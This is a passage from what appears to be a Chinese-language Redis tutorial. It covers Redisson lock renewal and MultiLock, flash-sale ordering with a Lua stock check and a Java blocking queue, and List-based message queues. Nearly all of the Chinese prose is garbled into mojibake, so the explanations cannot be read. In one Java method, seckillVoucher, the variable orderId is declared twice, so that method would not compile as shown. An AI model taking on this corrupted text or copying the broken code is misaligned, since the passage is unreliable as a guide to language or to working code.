return;\n                }\n                \n                if (res) {\n                    // reschedule itself\n                    renewExpiration();\n                }\n            });\n        }\n    }, internalLockLeaseTime / 3, TimeUnit.MILLISECONDS);\n    //internalLockLeaseTime = 30s\n    ee.setTimeout(task);\n}\n```\n\n`commandExecutor.getConnectionManager().newTimeout()`\n\n æ­¤æ–¹æ³•å‚æ•°ï¼š(  new TimerTask() {}ï¼Œå‚æ•°2 ï¼Œå‚æ•°3  )\n\né€šè¿‡å‚æ•°2ï¼Œå‚æ•°3 å»æè¿°ä»€ä¹ˆæ—¶å€™å»åšå‚æ•°1çš„äº‹æƒ…ï¼Œç°åœ¨çš„æƒ…å†µæ˜¯ï¼š10sä¹‹åå»åšå‚æ•°ä¸€çš„äº‹æƒ…\n\nå› ä¸ºé”çš„å¤±æ•ˆæ—¶é—´æ˜¯30sï¼Œå½“10sä¹‹åï¼Œæ­¤æ—¶è¿™ä¸ªtimeTask å°±è§¦å‘äº†ï¼Œä»–å°±å»è¿›è¡Œç»­çº¦ï¼ŒæŠŠå½“å‰è¿™æŠŠé”ç»­çº¦æˆ30sï¼Œå¦‚æœæ“ä½œæˆåŠŸï¼Œé‚£ä¹ˆæ­¤æ—¶å°±ä¼šé€’å½’è°ƒç”¨è‡ªå·±ï¼Œå†é‡æ–°è®¾ç½®ä¸€ä¸ªtimeTask()ï¼Œäºæ˜¯å†è¿‡10sååˆå†è®¾ç½®ä¸€ä¸ªtimerTaskï¼Œå®Œæˆä¸åœçš„ç»­çº¦\n\né‚£ä¹ˆå¤§å®¶å¯ä»¥æƒ³ä¸€æƒ³ï¼Œå‡è®¾æˆ‘ä»¬çš„çº¿ç¨‹å‡ºç°äº†å®•æœºä»–è¿˜ä¼šç»­çº¦å—ï¼Ÿå½“ç„¶ä¸ä¼šï¼Œå› ä¸ºæ²¡æœ‰äººå†å»è°ƒç”¨renewExpirationè¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥ç­‰åˆ°æ—¶é—´ä¹‹åè‡ªç„¶å°±é‡Šæ”¾äº†ã€‚\n\n### 3.æ€»ç»“\n\nRedissonåˆ†å¸ƒå¼é”åŸç†ï¼š\n\n- **å¯é‡å…¥**ï¼šåˆ©ç”¨hashç»“æ„è®°å½•çº¿ç¨‹idå’Œé‡å…¥æ¬¡æ•°\n\n- **å¯é‡è¯•**ï¼šåˆ©ç”¨ä¿¡å·é‡å’ŒPubSubåŠŸèƒ½å®ç°ç­‰å¾…ã€å”¤é†’ï¼Œè·å–é”å¤±è´¥çš„é‡è¯•æœºåˆ¶\n\n- **è¶…æ—¶ç»­çº¦**ï¼šåˆ©ç”¨watchDogï¼Œæ¯éš”ä¸€æ®µæ—¶é—´ï¼ˆreleaseTime / 3ï¼‰ï¼Œé‡ç½®è¶…æ—¶æ—¶é—´\n\n## âºredissoné”çš„MutiLockåŸç†\n\nä¸ºäº†æé«˜redisçš„å¯ç”¨æ€§ï¼Œæˆ‘ä»¬ä¼šæ­å»ºé›†ç¾¤æˆ–è€…ä¸»ä»ï¼Œç°åœ¨ä»¥ä¸»ä»ä¸ºä¾‹\n\næ­¤æ—¶æˆ‘ä»¬å»å†™å‘½ä»¤ï¼Œå†™åœ¨ä¸»æœºä¸Šï¼Œ ä¸»æœºä¼šå°†æ•°æ®åŒæ­¥ç»™ä»æœºï¼Œä½†æ˜¯å‡è®¾åœ¨ä¸»æœºè¿˜æ²¡æœ‰æ¥å¾—åŠæŠŠæ•°æ®å†™å…¥åˆ°ä»æœºå»çš„æ—¶å€™ï¼Œæ­¤æ—¶ä¸»æœºå®•æœºï¼Œå“¨å…µä¼šå‘ç°ä¸»æœºå®•æœºï¼Œå¹¶ä¸”é€‰ä¸¾ä¸€ä¸ªslaveå˜æˆmasterï¼Œè€Œæ­¤æ—¶æ–°çš„masterä¸­å®é™…ä¸Šå¹¶æ²¡æœ‰é”ä¿¡æ¯ï¼Œæ­¤æ—¶é”ä¿¡æ¯å°±å·²ç»ä¸¢æ‰äº†ã€‚\n\n![](https://img.jwt1399.top/img/202211272155896.png)\n\nä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œredissionæå‡ºæ¥äº†**MutiLocké”**ï¼Œä½¿ç”¨è¿™æŠŠé”å°±ä¸ä½¿ç”¨ä¸»ä»äº†ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„åœ°ä½éƒ½æ˜¯ä¸€æ ·çš„ï¼Œ è¿™æŠŠé”åŠ é”çš„é€»è¾‘éœ€è¦å†™å…¥åˆ°æ¯ä¸€ä¸ªä¸»ä¸›èŠ‚ç‚¹ä¸Šï¼Œåªæœ‰æ‰€æœ‰çš„æœåŠ¡å™¨éƒ½å†™å…¥æˆåŠŸï¼Œæ­¤æ—¶æ‰æ˜¯åŠ é”æˆåŠŸï¼Œå‡è®¾ç°åœ¨æŸä¸ªèŠ‚ç‚¹æŒ‚äº†ï¼Œé‚£ä¹ˆä»–å»è·å¾—é”çš„æ—¶å€™ï¼Œåªè¦æœ‰ä¸€ä¸ªèŠ‚ç‚¹æ‹¿ä¸åˆ°ï¼Œéƒ½ä¸èƒ½ç®—æ˜¯åŠ é”æˆåŠŸï¼Œå°±ä¿è¯äº†åŠ é”çš„å¯é æ€§ã€‚\n\n![](https://img.jwt1399.top/img/202211272155368.png)\n\né‚£ä¹ˆMutiLock åŠ é”åŸç†æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\n\nå½“æˆ‘ä»¬å»è®¾ç½®äº†å¤šä¸ªé”æ—¶ï¼Œredissionä¼šå°†å¤šä¸ªé”æ·»åŠ åˆ°ä¸€ä¸ªé›†åˆä¸­ï¼Œç„¶åç”¨whileå¾ªç¯å»ä¸åœå»å°è¯•æ‹¿é”ï¼Œä½†æ˜¯ä¼šæœ‰ä¸€ä¸ªæ€»å…±çš„åŠ é”æ—¶é—´ï¼Œè¿™ä¸ªæ—¶é—´æ˜¯ç”¨éœ€è¦åŠ é”çš„ä¸ªæ•° * 1500ms ï¼Œå‡è®¾æœ‰3ä¸ªé”ï¼Œé‚£ä¹ˆæ—¶é—´å°±æ˜¯4500msï¼Œå‡è®¾åœ¨è¿™4500mså†…ï¼Œæ‰€æœ‰çš„é”éƒ½åŠ é”æˆåŠŸï¼Œ é‚£ä¹ˆæ­¤æ—¶æ‰ç®—æ˜¯åŠ é”æˆåŠŸï¼Œå¦‚æœåœ¨4500msæœ‰çº¿ç¨‹åŠ é”å¤±è´¥ï¼Œåˆ™ä¼šå†æ¬¡å»è¿›è¡Œé‡è¯•\n\n![](https://img.jwt1399.top/img/202211272200499.png)\n\n## â»æ€»ç»“\n\n**1ï¼‰ä¸å¯é‡å…¥Redisåˆ†å¸ƒå¼é”ï¼š**\n\n- åŸç†ï¼šåˆ©ç”¨setnxçš„äº’æ–¥æ€§ï¼›åˆ©ç”¨exé¿å…æ­»é”ï¼›é‡Šæ”¾é”æ—¶åˆ¤æ–­çº¿ç¨‹æ ‡ç¤º\n\n- ç¼ºé™·ï¼šä¸å¯é‡å…¥ã€æ— æ³•é‡è¯•ã€é”è¶…æ—¶å¤±æ•ˆ\n\n**2ï¼‰å¯é‡å…¥çš„Redisåˆ†å¸ƒå¼é”ï¼š**\n\n- åŸç†ï¼šåˆ©ç”¨hashç»“æ„ï¼Œè®°å½•çº¿ç¨‹æ ‡ç¤ºå’Œé‡å…¥æ¬¡æ•°ï¼›åˆ©ç”¨watchDogå»¶ç»­é”æ—¶é—´ï¼›åˆ©ç”¨ä¿¡å·é‡æ§åˆ¶é”é‡è¯•ç­‰å¾…\n\n- ç¼ºé™·ï¼šrediså®•æœºå¼•èµ·é”å¤±æ•ˆé—®é¢˜\n\n**3ï¼‰Redissonçš„multiLockï¼š**\n\n- åŸç†ï¼šå¤šä¸ªç‹¬ç«‹çš„RedisèŠ‚ç‚¹ï¼Œå¿…é¡»åœ¨æ‰€æœ‰èŠ‚ç‚¹éƒ½è·å–é‡å…¥é”ï¼Œæ‰ç®—è·å–é”æˆåŠŸ\n\n- ç¼ºé™·ï¼šè¿ç»´æˆæœ¬é«˜ã€å®ç°å¤æ‚\n\n# â‘¥ç§’æ€ä¼˜åŒ–\n\n## â¶å¼‚æ­¥ç§’æ€æ€è·¯\n\nå›é¡¾ä¸‹å•æµç¨‹ï¼šå½“ç”¨æˆ·å‘èµ·è¯·æ±‚ï¼Œæ­¤æ—¶ä¼šè¯·æ±‚nginxï¼Œnginxä¼šè®¿é—®åˆ°tomcatï¼Œè€Œtomcatä¸­çš„ç¨‹åºï¼Œä¼šè¿›è¡Œä¸²è¡Œæ“ä½œï¼Œåˆ†æˆå¦‚ä¸‹å‡ ä¸ªæ­¥éª¤\n\n- 1ã€æŸ¥è¯¢ä¼˜æƒ å·\n\n- 2ã€åˆ¤æ–­ç§’æ€åº“å­˜æ˜¯å¦è¶³å¤Ÿ\n\n- 3ã€æŸ¥è¯¢è®¢å•\n\n- 4ã€æ ¡éªŒæ˜¯å¦æ˜¯ä¸€äººä¸€å•\n\n- 5ã€æ‰£å‡åº“å­˜\n\n- 6ã€åˆ›å»ºè®¢å•\n\nåœ¨è¿™å…­æ­¥æ“ä½œä¸­ï¼Œæœ‰å¾ˆå¤šæ“ä½œæ˜¯è¦å»æ“ä½œæ•°æ®åº“çš„ï¼Œè€Œä¸”è¿˜æ˜¯ä¸€ä¸ªçº¿ç¨‹ä¸²è¡Œæ‰§è¡Œï¼Œ è¿™æ ·å°±ä¼šå¯¼è‡´æˆ‘ä»¬çš„ç¨‹åºæ‰§è¡Œçš„å¾ˆæ…¢ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¼‚æ­¥ç¨‹åºæ‰§è¡Œï¼Œé‚£ä¹ˆå¦‚ä½•åŠ é€Ÿå‘¢ï¼Ÿ\n\n| åŸå§‹æ–¹æ¡ˆ                                             | ä¼˜åŒ–æ–¹æ¡ˆ                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202211281342647.png) | ![](https://img.jwt1399.top/img/202211281342574.png) |\n\nä¼˜åŒ–æ–¹æ¡ˆï¼šæˆ‘ä»¬å°†è€—æ—¶æ¯”è¾ƒçŸ­çš„é€»è¾‘åˆ¤æ–­æ”¾å…¥åˆ°redisä¸­ï¼Œæ¯”å¦‚åº“å­˜æ˜¯å¦è¶³å¤Ÿã€æ˜¯å¦ä¸€äººä¸€å•ï¼Œåªè¦è¿™ç§é€»è¾‘å¯ä»¥å®Œæˆï¼Œå°±æ„å‘³ç€æˆ‘ä»¬æ˜¯ä¸€å®šå¯ä»¥ä¸‹å•å®Œæˆçš„ï¼Œæˆ‘ä»¬åªéœ€è¦è¿›è¡Œå¿«é€Ÿçš„é€»è¾‘åˆ¤æ–­ï¼Œæ ¹æœ¬å°±ä¸ç”¨ç­‰ä¸‹å•é€»è¾‘èµ°å®Œï¼Œå°±å¯ä»¥ç›´æ¥ç»™ç”¨æˆ·è¿”å›æˆåŠŸï¼Œ å†åœ¨åå°å¼€ä¸€ä¸ªçº¿ç¨‹ï¼Œåå°çº¿ç¨‹æ…¢æ…¢çš„å»æ‰§è¡Œqueueé‡Œè¾¹çš„æ¶ˆæ¯ï¼Œè¿™æ ·ç¨‹åºä¸å°±è¶…çº§å¿«äº†å—ï¼Ÿå½“ç„¶è¿™é‡Œè¾¹æœ‰ä¸¤ä¸ªéš¾ç‚¹\n\n- ç¬¬ä¸€ä¸ªéš¾ç‚¹æ˜¯æˆ‘ä»¬æ€ä¹ˆåœ¨redisä¸­å»å¿«é€Ÿæ ¡éªŒä¸€äººä¸€å•ï¼Œè¿˜æœ‰åº“å­˜åˆ¤æ–­\n\n- ç¬¬äºŒä¸ªéš¾ç‚¹æ˜¯ç”±äºæˆ‘ä»¬æ ¡éªŒå’Œä¸‹å•æ˜¯ä¸¤ä¸ªçº¿ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•çŸ¥é“åˆ°åº•å“ªä¸ªå•ä»–æœ€åæ˜¯å¦æˆåŠŸï¼Œæˆ–è€…æ˜¯ä¸‹å•å®Œæˆï¼Œä¸ºäº†å®Œæˆè¿™ä»¶äº‹æˆ‘ä»¬åœ¨redisæ“ä½œå®Œä¹‹åï¼Œæˆ‘ä»¬ä¼šå°†ä¸€äº›ä¿¡æ¯è¿”å›ç»™å‰ç«¯ï¼ŒåŒæ—¶ä¹Ÿä¼šæŠŠè¿™äº›ä¿¡æ¯ä¸¢åˆ°å¼‚æ­¥queueä¸­å»ï¼Œåç»­æ“ä½œä¸­ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªidæ¥æŸ¥è¯¢æˆ‘ä»¬tomcatä¸­çš„ä¸‹å•é€»è¾‘æ˜¯å¦å®Œæˆäº†ã€‚\n\n![](https://img.jwt1399.top/img/202211272239865.png)\n\n* **æ­¥éª¤ä¸€ï¼š**æ–°å¢ç§’æ€ä¼˜æƒ åˆ¸çš„åŒæ—¶ï¼Œå°†ä¼˜æƒ åˆ¸ä¿¡æ¯ä¿å­˜åˆ°Redisä¸­\n\n* **æ­¥éª¤äºŒï¼š**åŸºäºLuaè„šæœ¬ï¼Œåˆ¤æ–­ç§’æ€åº“å­˜ã€ä¸€äººä¸€å•ï¼Œå†³å®šç”¨æˆ·æ˜¯å¦æŠ¢è´­æˆåŠŸ\n\n* **æ­¥éª¤ä¸‰ï¼š**å¦‚æœæŠ¢è´­æˆåŠŸï¼Œå°†ä¼˜æƒ åˆ¸idã€ç”¨æˆ·idã€è®¢å•idå°è£…åå­˜å…¥é˜»å¡é˜Ÿåˆ—\n\n* **æ­¥éª¤å››ï¼š**å¼€å¯çº¿ç¨‹ä»»åŠ¡ï¼Œä¸æ–­ä»é˜»å¡é˜Ÿåˆ—ä¸­è·å–ä¿¡æ¯ï¼Œå®ç°å¼‚æ­¥ä¸‹å•åŠŸèƒ½\n\n## â·Rediså®Œæˆç§’æ€èµ„æ ¼åˆ¤æ–­\n\n**æ­¥éª¤ä¸€**\n\n```java\n@Override\n@Transactional\npublic void addSeckillVoucher(Voucher voucher) {\n    // ä¿å­˜ä¼˜æƒ åˆ¸\n    save(voucher);\n    // ä¿å­˜ç§’æ€ä¿¡æ¯\n    SeckillVoucher seckillVoucher = new SeckillVoucher();\n    seckillVoucher.setVoucherId(voucher.getId());\n    seckillVoucher.setStock(voucher.getStock());\n    seckillVoucher.setBeginTime(voucher.getBeginTime());\n    seckillVoucher.setEndTime(voucher.getEndTime());\n    seckillVoucherService.save(seckillVoucher);\n    // ä¿å­˜ç§’æ€åº“å­˜åˆ°Redisä¸­\n    stringRedisTemplate.opsForValue().set(SECKILL_STOCK_KEY + voucher.getId(), voucher.getStock().toString());\n}\n```\n\n**æ­¥éª¤äºŒ**\n\n<img src=\"../images/Redis-å®æˆ˜ç¯‡/image-20221128135703650.png\" style=\"zoom:50%;\" />\n\n```lua\n-- 1.å‚æ•°åˆ—è¡¨\n-- 1.1.ä¼˜æƒ åˆ¸id\nlocal voucherId = ARGV[1]\n-- 1.2.ç”¨æˆ·id\nlocal userId = ARGV[2]\n-- 1.3.è®¢å•id\nlocal orderId = ARGV[3]\n\n-- 2.æ•°æ®key\n-- 2.1.åº“å­˜key\nlocal stockKey = 'seckill:stock:' .. voucherId\n-- 2.2.è®¢å•key\nlocal orderKey = 'seckill:order:' .. voucherId\n\n-- 3.è„šæœ¬ä¸šåŠ¡\n-- 3.1.åˆ¤æ–­åº“å­˜æ˜¯å¦å……è¶³ get stockKey   \nif(tonumber(redis.call('get', stockKey)) <= 0) then -- tonumberï¼ˆstring è½¬ num)\n    -- åº“å­˜ä¸è¶³ï¼Œè¿”å›1\n    return 1\nend\n-- 3.2.åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸‹å• SISMEMBER orderKey userId\nif(redis.call('sismember', orderKey, userId) == 1) then\n    -- 3.3.å­˜åœ¨ï¼Œè¯´æ˜æ˜¯é‡å¤ä¸‹å•ï¼Œè¿”å›2\n    return 2\nend\n-- 3.4.æ‰£åº“å­˜ incrby stockKey -1\nredis.call('incrby', stockKey, -1)\n-- 3.5.ä¸‹å•ï¼ˆä¿å­˜ç”¨æˆ·ï¼‰sadd orderKey userId\nredis.call('sadd', orderKey, userId)\nreturn 0\n```\n\n**æ­¥éª¤ä¸‰**\n\n<img src=\"../images/Redis-å®æˆ˜ç¯‡/image-20221128140938673.png\" style=\"zoom:50%;\" />\n\n```java\n// åŠ è½½luaè„šæœ¬\nprivate static final DefaultRedisScript<Long> SECKILL_SCRIPT;\nstatic {\n  SECKILL_SCRIPT = new DefaultRedisScript<>();\n  SECKILL_SCRIPT.setLocation(new ClassPathResource(\"seckill.lua\"));\n  SECKILL_SCRIPT.setResultType(Long.class);\n}\n\n//é˜»å¡é˜Ÿåˆ—\nprivate BlockingQueue<VoucherOrder> orderTasks =new  ArrayBlockingQueue<>(1024 * 1024);\n\nprivate IVoucherOrderService proxy;\n\n  @Override\npublic Result seckillVoucher(Long voucherId) {\n    //è·å–ç”¨æˆ·\n    Long userId = UserHolder.getUser().getId();\n    long orderId = redisIdWorker.nextId(\"order\");\n    // 1.æ‰§è¡Œluaè„šæœ¬\n    Long result = stringRedisTemplate.execute(\n            SECKILL_SCRIPT, \t\t\t\t\t\t//luaè„šæœ¬\n            Collections.emptyList(),   //KEY\n            voucherId.toString(),     //ARGV[1]\n      \t\t\tuserId.toString(),       //ARGV[2]\n      \t\t\tString.valueOf(orderId) //ARGV[3]\n    );\n    int r = result.intValue(); //è½¬æˆint\n    // 2.åˆ¤æ–­ç»“æœæ˜¯å¦ä¸º0\n    if (r != 0) {\n        // 2.1.ä¸ä¸º0 ï¼Œä»£è¡¨æ²¡æœ‰è´­ä¹°èµ„æ ¼\n        return Result.fail(r == 1 ? \"åº“å­˜ä¸è¶³\" : \"ä¸èƒ½é‡å¤ä¸‹å•\");\n    }\n  \t\n    //2.2.ä¸º0ï¼Œä¿¡æ¯ä¿å­˜åˆ°é˜»å¡é˜Ÿåˆ—\n    VoucherOrder voucherOrder = new VoucherOrder();\n    // 2.2.1è®¢å•id\n    long orderId = redisIdWorker.nextId(\"order\");\n    voucherOrder.setId(orderId);\n    // 2.2.2ç”¨æˆ·id\n    voucherOrder.setUserId(userId);\n    // 2.2.3ä»£é‡‘åˆ¸id\n    voucherOrder.setVoucherId(voucherId);\n    // 2.2.4æ”¾å…¥é˜»å¡é˜Ÿåˆ—\n    orderTasks.add(voucherOrder);\n    // 3.è·å–ä»£ç†å¯¹è±¡\n    proxy = (IVoucherOrderService)AopContext.currentProxy();\n  \n    // 4.è¿”å›è®¢å•id\n    return Result.ok(orderId);\n}\n```\n\n## â¸åŸºäºé˜»å¡é˜Ÿåˆ—å®ç°ç§’æ€ä¼˜åŒ–\n\n**æ­¥éª¤å››**\n\nç°åœ¨æˆ‘ä»¬å»ä¸‹å•æ—¶ï¼Œæ˜¯é€šè¿‡luaè¡¨è¾¾å¼å»åŸå­æ‰§è¡Œåˆ¤æ–­é€»è¾‘ï¼Œå¦‚æœåˆ¤æ–­æˆ‘å‡ºæ¥ä¸ä¸º0 ï¼Œåˆ™è¦ä¹ˆæ˜¯åº“å­˜ä¸è¶³ï¼Œè¦ä¹ˆæ˜¯é‡å¤ä¸‹å•ï¼Œè¿”å›é”™è¯¯ä¿¡æ¯ï¼›å¦‚æœæ˜¯0ï¼Œåˆ™æŠŠä¸‹å•çš„é€»è¾‘ä¿å­˜åˆ°é˜Ÿåˆ—ä¸­å»ï¼Œç„¶åå¼‚æ­¥æ‰§è¡Œ\n\n```java\n//å¼‚æ­¥å¤„ç†çº¿ç¨‹æ± \nprivate static final ExecutorService SECKILL_ORDER_EXECUTOR = Executors.newSingleThreadExecutor();\n\n//åœ¨ç±»åˆå§‹åŒ–ä¹‹åæ‰§è¡Œï¼Œå› ä¸ºå½“è¿™ä¸ªç±»åˆå§‹åŒ–å¥½äº†ä¹‹åï¼Œéšæ—¶éƒ½æ˜¯æœ‰å¯èƒ½è¦æ‰§è¡Œçš„\n@PostConstruct\nprivate void init() {\n  SECKILL_ORDER_EXECUTOR.submit(new VoucherOrderHandler());\n}\n\n// ç”¨äºçº¿ç¨‹æ± å¤„ç†çš„ä»»åŠ¡\n// å½“åˆå§‹åŒ–å®Œæ¯•åï¼Œå°±ä¼šå»ä»å¯¹åˆ—ä¸­å»æ‹¿ä¿¡æ¯\nprivate class VoucherOrderHandler implements Runnable {\n  @Override\n  public void run() {\n    while (true) {\n      try {\n        // 1.è·å–é˜Ÿåˆ—ä¸­çš„è®¢å•ä¿¡æ¯\n        VoucherOrder voucherOrder = orderTasks.take();\n        // 2.åˆ›å»ºè®¢å•\n        handleVoucherOrder(voucherOrder);\n      } catch (Exception e) {\n        log.error(\"å¤„ç†è®¢å•å¼‚å¸¸\", e);\n      }\n    }\n  }\n}\n\n// åˆ›å»ºè®¢å•\nprivate void handleVoucherOrder(VoucherOrder voucherOrder) {\n  //1.è·å–ç”¨æˆ·\n  Long userId = voucherOrder.getUserId();\n  // 2.åˆ›å»ºé”å¯¹è±¡\n  RLock lock = redissonClient.getLock(\"lock:order:\" + userId);\n  // 3.å°è¯•è·å–é”\n  boolean isLock = lock.tryLock();\n  // 4.åˆ¤æ–­æ˜¯å¦è·å¾—é”æˆåŠŸ\n  if (!isLock) {\n    // è·å–é”å¤±è´¥ï¼Œç›´æ¥è¿”å›å¤±è´¥æˆ–è€…é‡è¯•\n    log.error(\"ä¸å…è®¸é‡å¤ä¸‹å•ï¼\");\n    return;\n  }\n  try {\n    //æ³¨æ„ï¼šç”±äºæ˜¯springçš„äº‹åŠ¡æ˜¯æ”¾åœ¨threadLocalä¸­ï¼Œæ­¤æ—¶çš„æ˜¯å¤šçº¿ç¨‹ï¼Œäº‹åŠ¡ä¼šå¤±æ•ˆ\n    proxy.createVoucherOrder(voucherOrder);\n  } finally {\n    // é‡Šæ”¾é”\n    lock.unlock();\n  }\n}\n@Transactional\npublic void createVoucherOrder(VoucherOrder voucherOrder) {\n  Long userId = voucherOrder.getUserId();\n  // 5.1.æŸ¥è¯¢è®¢å•\n  int count = query().eq(\"user_id\", userId).eq(\"voucher_id\", voucherOrder.getVoucherId()).count();\n  // 5.2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨\n  if (count > 0) {\n    // ç”¨æˆ·å·²ç»è´­ä¹°è¿‡äº†\n    log.error(\"ç”¨æˆ·å·²ç»è´­ä¹°è¿‡äº†\");\n    return ;\n  }\n\n  // 6.æ‰£å‡åº“å­˜\n  boolean success = seckillVoucherService.update()\n    .setSql(\"stock = stock - 1\") // set stock = stock - 1\n    .eq(\"voucher_id\", voucherOrder.getVoucherId()).gt(\"stock\", 0) //where id = ? and stock > 0\n    .update();\n  if (!success) {\n    // æ‰£å‡å¤±è´¥\n    log.error(\"åº“å­˜ä¸è¶³\");\n    return ;\n  }\n  save(voucherOrder);\n}\n```\n\n## â¹æ€»ç»“\n\nç§’æ€ä¸šåŠ¡çš„ä¼˜åŒ–æ€è·¯æ˜¯ä»€ä¹ˆï¼Ÿ\n\n* å…ˆåˆ©ç”¨Rediså®Œæˆåº“å­˜ä½™é‡ã€ä¸€äººä¸€å•åˆ¤æ–­ï¼Œå®ŒæˆæŠ¢å•ä¸šåŠ¡\n* å†å°†ä¸‹å•ä¸šåŠ¡æ”¾å…¥é˜»å¡é˜Ÿåˆ—ï¼Œåˆ©ç”¨ç‹¬ç«‹çº¿ç¨‹å¼‚æ­¥ä¸‹å•\n* åŸºäºé˜»å¡é˜Ÿåˆ—çš„å¼‚æ­¥ç§’æ€å­˜åœ¨å“ªäº›é—®é¢˜ï¼Ÿ\n  * å†…å­˜é™åˆ¶é—®é¢˜\n  * æ•°æ®å®‰å…¨é—®é¢˜\n\n# â‘¦Redisæ¶ˆæ¯é˜Ÿåˆ—\n\n## â¶è®¤è¯†æ¶ˆæ¯é˜Ÿåˆ—\n\nä»€ä¹ˆæ˜¯æ¶ˆæ¯é˜Ÿåˆ—ï¼šå­˜æ”¾æ¶ˆæ¯çš„é˜Ÿåˆ—ã€‚æœ€ç®€å•çš„æ¶ˆæ¯é˜Ÿåˆ—æ¨¡å‹åŒ…æ‹¬3ä¸ªè§’è‰²ï¼š\n\n* æ¶ˆæ¯é˜Ÿåˆ—ï¼šå­˜å‚¨å’Œç®¡ç†æ¶ˆæ¯ï¼Œä¹Ÿè¢«ç§°ä¸ºæ¶ˆæ¯ä»£ç†ï¼ˆMessage Brokerï¼‰\n* ç”Ÿäº§è€…ï¼šå‘é€æ¶ˆæ¯åˆ°æ¶ˆæ¯é˜Ÿåˆ—\n* æ¶ˆè´¹è€…ï¼šä»æ¶ˆæ¯é˜Ÿåˆ—è·å–æ¶ˆæ¯å¹¶å¤„ç†æ¶ˆæ¯\n\nä½¿ç”¨é˜Ÿåˆ—çš„å¥½å¤„åœ¨äº **è§£è€¦ï¼š**æ‰€è°“è§£è€¦ï¼Œä¸¾ä¸€ä¸ªç”Ÿæ´»ä¸­çš„ä¾‹å­å°±æ˜¯ï¼šå¿«é€’å‘˜(ç”Ÿäº§è€…)æŠŠå¿«é€’æ”¾åˆ°å¿«é€’æŸœé‡Œè¾¹(Message Queue)å»ï¼Œæˆ‘ä»¬(æ¶ˆè´¹è€…)ä»å¿«é€’æŸœé‡Œè¾¹å»æ‹¿ä¸œè¥¿ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå¼‚æ­¥ï¼Œå¦‚æœè€¦åˆï¼Œé‚£ä¹ˆè¿™ä¸ªå¿«é€’å‘˜ç›¸å½“äºç›´æ¥æŠŠå¿«é€’äº¤ç»™ä½ ï¼Œè¿™äº‹å›ºç„¶å¥½ï¼Œä½†æ˜¯ä¸‡ä¸€ä½ ä¸åœ¨å®¶ï¼Œé‚£ä¹ˆå¿«é€’å‘˜å°±ä¼šä¸€ç›´ç­‰ä½ ï¼Œè¿™å°±æµªè´¹äº†å¿«é€’å‘˜çš„æ—¶é—´ï¼Œæ‰€ä»¥è¿™ç§æ€æƒ³åœ¨æˆ‘ä»¬æ—¥å¸¸å¼€å‘ä¸­ï¼Œæ˜¯éå¸¸æœ‰å¿…è¦çš„ã€‚\n\n![](https://img.jwt1399.top/img/202211281835719.png)\n\nè¿™ç§åœºæ™¯åœ¨æˆ‘ä»¬ç§’æ€ä¸­å°±å˜æˆäº†ï¼šæˆ‘ä»¬ä¸‹å•ä¹‹åï¼Œåˆ©ç”¨rediså»è¿›è¡Œæ ¡éªŒä¸‹å•æ¡ä»¶ï¼Œå†é€šè¿‡é˜Ÿåˆ—æŠŠæ¶ˆæ¯å‘é€å‡ºå»ï¼Œç„¶åå†å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹å»æ¶ˆè´¹è¿™ä¸ªæ¶ˆæ¯ï¼Œå®Œæˆè§£è€¦ï¼ŒåŒæ—¶ä¹ŸåŠ å¿«æˆ‘ä»¬çš„å“åº”é€Ÿåº¦ã€‚\n\nè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›ç°æˆçš„mqï¼Œæ¯”å¦‚kafkaï¼Œrabbitmqç­‰ç­‰ï¼Œä½†æ˜¯å‘¢ï¼Œå¦‚æœæ²¡æœ‰å®‰è£…mqï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨redisæä¾›çš„mqæ–¹æ¡ˆï¼Œé™ä½æˆ‘ä»¬çš„éƒ¨ç½²å’Œå­¦ä¹ æˆæœ¬ã€‚\n\n## â·åŸºäºListå®ç°æ¶ˆæ¯é˜Ÿåˆ—\n\nRedisçš„Listæ•°æ®ç»“æ„æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå¾ˆå®¹æ˜“æ¨¡æ‹Ÿå‡ºé˜Ÿåˆ—æ•ˆæœã€‚\n\né˜Ÿåˆ—æ˜¯å…¥å£å’Œå‡ºå£ä¸åœ¨ä¸€è¾¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ï¼šLPUSH ç»“åˆ RPOPã€æˆ–è€… RPUSH ç»“åˆ LPOPæ¥å®ç°ã€‚\nä¸è¿‡è¦æ³¨æ„çš„æ˜¯ï¼Œå½“é˜Ÿåˆ—ä¸­æ²¡æœ‰æ¶ˆæ¯æ—¶RPOPæˆ–LPOPæ“ä½œä¼šè¿”å›nullï¼Œå¹¶ä¸åƒJVMçš„é˜»å¡é˜Ÿåˆ—é‚£æ ·ä¼šé˜»å¡å¹¶ç­‰å¾…æ¶ˆæ¯ã€‚å› æ­¤è¿™é‡Œåº”è¯¥ä½¿ç”¨BRPOPæˆ–è€…BLPOPæ¥å®ç°é˜»å¡æ•ˆæœã€‚\n\n![](https://img.jwt1399.top/img/202211281839415.png)\n\nåŸºäºListçš„æ¶ˆæ¯é˜Ÿåˆ—æœ‰å“ªäº›ä¼˜ç¼ºç‚¹ï¼Ÿ\n\nä¼˜ç‚¹ï¼š\n\n* åˆ©ç”¨Rediså­˜å‚¨ï¼Œä¸å—é™äºJVMå†…å­˜ä¸Šé™\n* åŸºäºRedisçš„æŒä¹…åŒ–æœºåˆ¶ï¼Œæ•°æ®å®‰å…¨æ€§æœ‰ä¿è¯\n* å¯ä»¥æ»¡è¶³æ¶ˆæ¯æœ‰åºæ€§\n\nç¼ºç‚¹ï¼š\n\n* æ— æ³•é¿å…æ¶ˆæ¯ä¸¢å¤±\n* åªæ”¯æŒå•æ¶ˆè´¹è€…\n\n## 